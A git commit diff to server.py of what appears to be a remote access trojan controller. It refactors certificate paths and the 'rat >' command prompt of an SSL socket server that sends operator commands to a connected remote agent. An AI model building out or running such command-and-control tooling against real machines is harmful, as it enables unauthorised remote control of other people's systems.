1ea228878e1555c198335d984606e2daf9d97a3e
PerThoGon <enzo.marini888@gmail.com>
2024-06-11 01:55:28 +0200

    Modif interface et variables

--- server.py
+++ server.py
@@ -8,9 +8,12 @@ SERVER_PORT = 8888
 load_dotenv()
 ip_server = os.getenv('IP_SERVER')
 
+cert = './cert.pem'
+key = './key.pem'
+
 # Créer un contexte SSL
 context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
+context.load_cert_chain(certfile=cert, keyfile=key)
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((ip_server, SERVER_PORT))
@@ -23,7 +26,7 @@ with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
     print("[+] Agent received !")
 
     while True:
-        command = input("rat > ")
+        command = input("rat > Taper votre commande ici")
         if command.lower() == 'exit':
             client_socket.send(b'exit')
             break
